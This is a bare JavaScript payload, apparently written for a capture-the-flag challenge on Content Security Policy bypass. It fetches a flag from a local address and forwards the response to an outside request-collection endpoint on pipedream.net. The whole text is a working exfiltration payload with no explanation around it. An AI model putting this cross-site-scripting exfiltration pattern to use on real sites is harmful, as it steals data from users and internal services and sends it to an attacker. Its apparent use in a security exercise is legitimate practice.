var xhr = new XMLHttpRequest();
 xhr.open('GET','http://192.168.86.180:8000/csp-three-flag', true);
 xhr.onload = function () { var request = new XMLHttpRequest();
 request.open('GET', 'https://endiel6lj35l8.x.pipedream.net?flag='+xhr.responseText, true);
 request.send()};
 xhr.send(null);